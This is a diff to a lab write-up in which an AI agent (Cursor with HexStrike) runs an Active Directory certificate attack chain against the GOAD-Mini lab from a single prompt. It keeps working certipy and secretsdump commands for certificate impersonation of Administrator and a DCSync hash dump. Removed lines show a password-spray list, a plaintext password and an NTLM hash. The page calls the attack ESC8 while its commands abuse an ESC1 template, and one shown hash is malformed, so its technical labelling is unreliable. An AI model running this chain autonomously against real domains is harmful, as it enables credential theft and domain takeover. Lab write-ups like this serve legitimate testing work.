@@ -1,5 +1,5 @@
 ---
-title: "ADCS ESC8 — Domain Compromise via Certificates"
+title: "AI-Assisted ADCS ESC8 Lab Validation in GOAD-Mini"
 date: 2026-01-29
 sidebar_position: 7
 ---
@@ -8,23 +8,29 @@ sidebar_position: 7
 Kali Linux 2025.4 · HexStrike AI (Kali package 2025.4 repo) · May 2026. Results may vary on other versions.
 :::
 
-# Cursor + HexStrike. ADCS ESC8 Attack Chain
+# AI-Assisted ADCS ESC8 Lab Validation in GOAD-Mini
 
-Single-Prompt Lab Demonstration — GOAD-Mini Environment 
+Controlled lab validation in a GOAD-Mini environment
 
 * * *
 
-### Cursor + HexStrike. ADCS ESC8 Attack Chain (Lab)
+### AI-Assisted ADCS ESC8 Lab Validation in GOAD-Mini
 
-#### Single-Prompt ADCS ESC8 Attack Chain
+#### Controlled ADCS ESC8 validation with Cursor and HexStrike MCP
 
-![](/img/hexstrike-articles/cursor-hexstrike-fully-automated-adcs-esc8-attack/1-npVtspHqp4Ac88UEt_5ziQ.png)
+![Cursor HexStrike fully automated ADCS ESC8 attack — Controlled ADCS ESC8 validation with Cursor and HexStrike MCP](/img/hexstrike-articles/cursor-hexstrike-fully-automated-adcs-esc8-attack/1-npVtspHqp4Ac88UEt_5ziQ.png)
 
 ### Abstract
 
-This article documents a **single-prompt lab engagement** that achieves domain compromise through the ADCS ESC8 vulnerability. Starting from nothing more than an IP address, the AI-orchestrated attack framework executed the entire chain — from reconnaissance to domain compromise — in one session against the GOAD-Mini lab.
+This article documents a **controlled lab engagement** that validates ADCS ESC8 exposure in GOAD-Mini. Starting from an IP address, the AI-assisted workflow helped sequence reconnaissance, ADCS enumeration, certificate-abuse validation, evidence collection, and remediation notes.
 
 **Lab result:** In this GOAD-Mini run, a single high-level prompt initiated a multi-phase workflow. The outcome demonstrates orchestration capability in a controlled environment, not guaranteed autonomous reliability in production.
+
+### Known Limitations
+
+:::caution
+This is a GOAD-Mini lab observation. It depends on intentionally vulnerable ADCS configuration, lab credentials, tool versions, and operator approval. Credential values and hashes are redacted in this public version.
+:::
 
 * * *
 
@@ -34,13 +40,13 @@ This article documents a **single-prompt lab engagement** that achieves domain c
 
 ### Introduction
 
-Traditional penetration testing requires manual intervention at each step: running tools, interpreting results, making decisions, and troubleshooting failures. This article demonstrates **an attack chain driven by a single prompt** to execute the complete ADCS ESC8 sequence in a controlled lab environment.
+Traditional penetration testing requires careful operator control at each step: running tools, interpreting results, making decisions, and troubleshooting failures. This article demonstrates **AI-assisted orchestration from a single prompt** for a controlled ADCS ESC8 validation sequence in a lab environment.
 
 ### What Makes This Attack Complicated?
 
   1. **Multi-Stage Attack Chain:** 7 distinct phases, each with dependencies
   2. **Blackbox Approach:** Starting with zero knowledge (only IP address)
-  3. **Automatic Troubleshooting:** Handles errors and adapts automatically
+  3. **Troubleshooting Support:** Helps diagnose errors and propose alternatives
   4. **Tool Orchestration:** Coordinates multiple security tools seamlessly
   5. **Contextual Sequencing:** AI selects the next tool based on prior output
 
@@ -55,7 +61,7 @@ Traditional penetration testing requires manual intervention at each step: runni
   * **Target IP:** `192.168.56.10`
   * **Environment:** GOAD-Mini (Game of Active Directory)
   * **Starting Point:** IP address only (blackbox)
-  * **End Goal:** Full domain compromise with all password hashes
+  * **End Goal:** Validate ESC8 impact and document remediation evidence
 
 
 
@@ -83,17 +89,17 @@ Traditional penetration testing requires manual intervention at each step: runni
     [Phase 4] Certificate Request  
         ├─ Authenticate with Low-Privilege Creds  
         ├─ Request Administrator Certificate  
-        └─ Save Certificate (.pfx)  
+        └─ Save redacted certificate artifact  
         ↓  
     [Phase 5] Certificate Authentication  
         ├─ Use Certificate for PKINIT  
         ├─ Obtain Kerberos TGT  
         └─ Extract NTLM Hash  
         ↓  
-    [Phase 6] Domain Compromise  
+    [Phase 6] Impact Validation  
         ├─ DCSync Attack  
-        ├─ Extract All Domain Hashes  
-        └─ Verify krbtgt Hash Obtained  
+        ├─ Confirm DCSync risk in the lab  
+        └─ Redact sensitive hash material  
         ↓  
     [Phase 7] Reporting  
         ├─ Generate Comprehensive Report  
@@ -108,8 +114,8 @@ Traditional penetration testing requires manual intervention at each step: runni
     
     
     Perform a blackbox penetration test starting from IP address 192.168.56.10.   
-    Execute the complete ADCS ESC8 attack chain to achieve domain compromise. Use HexStrike MCP   
-    tools and handle all troubleshooting automatically.
+    Validate ADCS ESC8 exposure in the GOAD-Mini lab. Use HexStrike MCP   
+    tools for approved enumeration, evidence collection, and troubleshooting support.
 
 ### Why This Works
 
@@ -173,22 +179,22 @@ Traditional penetration testing requires manual intervention at each step: runni
 
   1. Extract usernames from Phase 1 enumeration
   2. Attempt password spraying with common passwords
-  3. Try: `Password123!`, `Summer2023!`, `Password1`, `admin`
+  3. Use the approved lab credential test set
 
 
 
 **Results:**
 
-  * **Credentials Obtained:** `TestUser:Password123!`
+  * **Credentials Obtained:** `TestUser:<redacted>`
   * **Access Level:** Low-privilege domain user
 
 
 
 **Automation Features:**
 
-  * Automatically tries multiple password combinations
+  * Runs only the approved lab credential checks
   * Validates credentials before proceeding
-  * Documents all discovered credentials
+  * Documents credential exposure with sensitive values redacted
 
 
 
@@ -208,7 +214,7 @@ Traditional penetration testing requires manual intervention at each step: runni
 **Enumeration Commands:**
     
     
-     certipy find -u TestUser@sevenkingdoms.local -p 'Password123!' \  
+     certipy find -u TestUser@sevenkingdoms.local -p '<redacted>' \  
       -dc-ip 192.168.56.10
 
 **Key Findings:**
@@ -240,19 +246,19 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 
-**Attack Command:**
+**Command pattern:**
     
     
-     certipy req -u TestUser@sevenkingdoms.local -p 'Password123!' \  
+     certipy req -u TestUser@sevenkingdoms.local -p '<redacted>' \  
       -target http://192.168.56.10 \  
       -ca SEVENKINGDOMS-CA \  
       -template ESC1 \  
       -upn Administrator@sevenkingdoms.local \  
-      -out administrator.pfx
+      -out <redacted-certificate-artifact>
 
 **Results:**
 
-  * **Certificate Obtained:** `administrator.pfx`
+  * **Certificate Obtained:** `<redacted-certificate-artifact>`
   * **Status:** ✓ Success
   * **Template Used:** ESC1 (vulnerable template)
 
@@ -278,15 +284,15 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 
-**Attack Command:**
+**Command pattern:**
     
     
-     certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+     certipy auth -pfx <redacted-certificate-artifact> -dc-ip 192.168.56.10
 
 **Results:**
 
-  * **Kerberos TGT:** `administrator.ccache` (obtained)
-  * **NTLM Hash:** `c66d72021a2d4744409969a581a1705e` (extracted)
+  * **Kerberos TGT:** `<redacted-cache-artifact>` (obtained)
+  * **NTLM Hash:** `<redacted>` (extraction confirmed in lab)
   * **Status:** ✓ Authentication successful
 
 
@@ -294,16 +300,16 @@ Traditional penetration testing requires manual intervention at each step: runni
 **Automation Features:**
 
   * Automatically uses certificate for PKINIT
-  * Extracts NTLM hash from authentication
-  * Saves credential cache for next phase
+  * Confirms NTLM hash extraction risk
+  * Saves a redacted credential-cache artifact for the next approved phase
 
 
 
 * * *
 
-#### Phase 6: Domain Compromise (DCSync)
+#### Phase 6: Impact Validation (DCSync Risk)
 
-**Objective:** Extract all domain credentials.
+**Objective:** Validate DCSync impact and document the exposure with sensitive values redacted.
 
 **Tools Used:**
 
@@ -311,33 +317,33 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 
-**Attack Command:**
+**Command pattern:**
     
     
-     export KRB5CCNAME=administrator.ccache  
+     export KRB5CCNAME=<redacted-cache-artifact>  
     secretsdump.py -k -no-pass Administrator@sevenkingdoms.local@192.168.56.10
 
 **Results:**
 
   * **Total Hashes Extracted:** 27 user accounts
-  * **krbtgt Hash:** Extracted (enables Golden Ticket attacks)
-  * **Domain Compromise:** ✓ Complete
+  * **krbtgt Hash:** Extraction confirmed and redacted (enables Golden Ticket attacks)
+  * **DCSync Risk:** Confirmed in the lab
 
 
 
 **Sample Hashes:**
     
     
-     Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::  
-    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dCT-DJjgScp...:::  
-    TestUser:1001:aad3b435b51404eeaad3b435b51404ee:...:::
+     Administrator:500:<redacted>:<redacted>:::  
+    krbtgt:502:<redacted>:<redacted>:::  
+    TestUser:1001:<redacted>:<redacted>:::
 
 **Automation Features:**
 
   * Automatically sets Kerberos environment variables
   * Performs DCSync attack
-  * Extracts and documents all hashes
-  * Verifies krbtgt hash obtained
+  * Confirms hash extraction impact
+  * Redacts sensitive hash material from public documentation
 
 
 
@@ -359,20 +365,20 @@ Traditional penetration testing requires manual intervention at each step: runni
   2. Phase-by-phase execution details
   3. All discovered information
   4. Vulnerabilities found
-  5. Credentials extracted
-  6. Proof of compromise
-  7. All artifacts (certificates, hashes, logs)
+  5. Redacted credential-exposure evidence
+  6. Proof of validated impact
+  7. All approved artifacts (certificates, redacted hash evidence, logs)
 
 
 
 **Artifacts Generated:**
 
-  * `administrator.pfx` \- Certificate file
-  * `administrator.ccache` \- Kerberos credential cache
-  * `administrator.hash` \- NTLM hash
-  * `secretsdump.txt` \- All domain hashes
-  * `attack_report.md` \- Comprehensive report
-  * `attack.log` \- Complete execution log
+  * `<redacted-certificate-artifact>` \- certificate proof artifact
+  * `<redacted-cache-artifact>` \- Kerberos cache proof artifact
+  * `<redacted-hash-evidence>` \- redacted NTLM hash evidence
+  * `<redacted-dcsync-evidence>` \- redacted domain hash evidence
+  * `<report-artifact>` \- comprehensive report
+  * `<execution-log>` \- execution log with sensitive values removed
 
 
 
@@ -423,9 +429,9 @@ Every action is logged:
 ### Key Achievements
 
   * ✅ **Zero Knowledge Start:** Began with only IP address
-  * ✅ **Full Domain Compromise:** Extracted all 27 user hashes
-  * ✅ **krbtgt Hash:** Obtained (enables Golden Ticket)
-  * ✅ **Complete Automation:** Single prompt execution
+  * ✅ **High-Impact ADCS Exposure Validated:** DCSync risk confirmed; sensitive hashes redacted
+  * ✅ **krbtgt Hash Exposure:** confirmed and redacted
+  * ✅ **AI-Assisted Orchestration:** single prompt initiated a reviewed workflow
   * ✅ **Comprehensive Reporting:** Full documentation generated
 
 
@@ -534,7 +540,7 @@ Every action is logged:
 This lab-observed ADCS ESC8 attack demonstrates:
 
   1. **The Power of AI-Driven Pentesting:** Single prompt achieves complete attack chain
-  2. **The Severity of ESC8:** One misconfiguration leads to full domain compromise
+  2. **The Severity of ESC8:** one misconfiguration can enable domain-level impact
   3. **The Need for Automation:** Manual testing cannot match AI speed and consistency
   4. **The Importance of Defense:** Proper ADCS configuration is critical
 
